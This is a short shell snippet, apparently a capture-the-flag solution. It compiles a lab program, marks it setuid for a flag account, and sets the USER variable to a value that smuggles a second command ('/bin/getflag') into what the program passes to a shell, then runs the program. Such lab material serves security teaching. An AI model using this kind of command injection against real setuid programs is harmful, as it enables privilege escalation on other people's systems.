gcc -o flag02-getlogin level2-getlogin.c
chown flag02:level02 ./flag02-getlogin
chmod 4750 ./flag02-getlogin
USER='level02; /bin/getflag #'
./flag02-getlogin
